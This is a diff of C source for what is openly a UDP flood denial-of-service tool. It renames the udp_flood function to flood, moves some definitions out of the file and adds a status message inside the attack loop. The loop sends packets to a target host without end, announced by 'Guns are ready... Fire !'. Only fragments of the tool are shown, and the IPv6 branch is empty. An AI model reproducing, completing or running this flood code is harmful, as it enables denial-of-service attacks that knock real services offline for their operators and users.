@@ -21,18 +21,8 @@
 #include <lib/mem.h>
 #include <lib/util.h>
 
-#include "udp_flood.h"
+#include "flood.h"
 
-#define PK_SIZE 256
-
-// udp_err_t type to retain errors from udp package
-typedef int udp_err_t;
-
-typedef struct udp_atk {
-	// depending on the args it will generate a proc_cb
-	// that will pe used to launch the attack.
-	void (*proc_cb)(void *);
-} udp_atk;
 
 // udp_setup4 fill up the conn4_t structure with the coresponding
 // information in order to fully bind the udp socket at a given host
@@ -69,6 +59,7 @@ static void udp_attack4(conn4_t *c)
 
 	STATUS("Guns are ready... Fire !");
 	for (;;) {
+		STATUS("Send packet !");
 		n = sendto(c->sock, c->buff, PK_SIZE * sizeof(unsigned char), 0,
 				   (SA *)&c->addr, sizeof(c));
 		if (!n) {
@@ -107,7 +98,7 @@ static void udp_attack4(conn4_t *c)
  * and start the attack.
  *
  */
-void udp_flood(arguments args)
+void flood(arguments args)
 {
 	//TODO
 	STATUS("UDP-FLOOD attack is starting.");
@@ -124,13 +115,11 @@ void udp_flood(arguments args)
 
 	switch (args.host_type) {
 	case IPV4:
-		STATUS("UDP-FLOOD is using IPV4");
-
+		STATUS("UDP-FLOOD is using ipv4.");
 		udp_setup4(conn->c4, args.host);
 		udp_attack4(conn->c4);
 		close(conn->c4->sock);
 		xfree(conn->c4->buff);
-
 		break;
 	case IPV6:
 		break;
